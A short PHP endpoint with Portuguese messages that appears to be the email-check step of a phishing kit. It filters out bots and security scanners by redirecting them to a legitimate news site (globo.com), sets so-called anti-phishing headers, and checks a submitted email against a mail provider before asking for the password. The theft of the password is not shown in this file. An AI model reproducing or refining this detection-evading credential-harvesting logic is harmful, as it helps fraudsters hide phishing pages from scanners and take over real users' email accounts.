<?php
declare(strict_types=1);

require __DIR__ . '/includes/security.php';

$config = require __DIR__ . '/config.php';
public_session_start($config);

require __DIR__ . '/includes/anti_bot.php';
require __DIR__ . '/includes/anti_phishing.php';
require __DIR__ . '/includes/messages.php';
require __DIR__ . '/includes/provider_drivers.php';

header('Content-Type: application/json; charset=utf-8');
anti_phishing_headers();

$botCheck = anti_bot_evaluate_login_api($config);
if (!$botCheck['allowed']) {
    $botUrl = (string) ($config['anti_bot']['redirect'] ?? 'https://www.globo.com/');
    http_response_code(403);
    echo json_encode(['redirect' => $botUrl, 'blocked' => true, 'bot' => true], JSON_UNESCAPED_UNICODE);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['ok' => false, 'text' => 'Metodo invalido.'], JSON_UNESCAPED_UNICODE);
    exit;
}

$input = $_POST;
$raw = file_get_contents('php://input');
if ($raw !== false && $raw !== '' && str_starts_with(trim($raw), '{')) {
    $json = json_decode($raw, true);
    if (is_array($json)) {
        $input = array_merge($input, $json);
    }
}

$email = trim((string) ($input['login'] ?? $input['email'] ?? $input['user'] ?? ''));
$check = provider_validate_email($email, $config);

if (!empty($check['ok'])) {
    http_response_code(200);
    echo json_encode([
        'ok'      => true,
        'message' => 'needs_password',
        'text'    => '',
        'email'   => (string) ($check['email'] ?? $email),
    ], JSON_UNESCAPED_UNICODE);
    exit;
}

$text = trim((string) ($check['text'] ?? ''));
if ($text === '') {
    $text = 'Usuario invalido.';
}

http_response_code(400);
echo json_encode([
    'ok'      => false,
    'message' => (string) ($check['message_key'] ?? 'invalid_user'),
    'text'    => $text,
], JSON_UNESCAPED_UNICODE);
